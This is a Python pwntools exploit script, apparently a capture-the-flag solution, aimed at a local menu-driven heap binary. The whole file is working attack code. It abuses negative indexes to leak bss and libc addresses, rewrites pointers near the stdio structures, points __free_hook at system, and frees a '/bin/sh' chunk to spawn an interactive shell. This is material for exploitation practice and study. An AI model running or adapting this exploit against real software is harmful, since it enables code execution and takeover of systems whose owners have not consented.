from pwn import *

context.log_level='debug'

p= process("./pwn")
context.log_level='debug'
# libc = ELF("./libc.so.6")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add():
    p.sendlineafter("Choice: ",str(1))

def free(index):
    p.sendlineafter("Choice: ",str(2))
    p.sendlineafter("Idx: ",str(index))

def show(index):
    p.sendlineafter("Choice: ",str(3))
    p.sendlineafter("Idx: ",str(index))

def edit(index,size,content):
    p.sendlineafter("Choice: ",str(4))
    p.sendlineafter("Idx: ",str(index))
    p.sendlineafter("Size: ",str(size))
    p.sendafter("Content: ",content)

attach(p)

add()
add()
show(-11)

bss = u64(p.recvuntil('\nDone')[1:-5].ljust(0x8, b'\x00'))
log.success("bss: 0x%x", bss)


payload = p64(bss) + p64(bss+0x28)
edit(-11,0x10,payload)
show(-10)

libc_base = u64(p.recvuntil('\nDone')[1:-5].ljust(0x8, b'\x00')) - 0x1ec980#stdin

log.success('libc_addr: 0x%x', libc_base)
free_hook = libc_base+libc.sym["__free_hook"]
system = libc_base + libc.sym['system']


# libc.address = libc_base
poc = p64(bss) + p64(0)*2 +p64(libc_base + libc.symbols['_IO_2_1_stdout_']) + p64(0) + p64(libc_base + libc.symbols['_IO_2_1_stdin_'])
poc += p64(0) + p64(libc_base + libc.symbols['_IO_2_1_stderr_']) + p64(0)*3 + p64(free_hook)
edit(-11,len(poc),poc)

pause()
edit(0,8,p64(system))
pause()
edit(1,8,'/bin/sh\x00')
free(1)

p.interactive()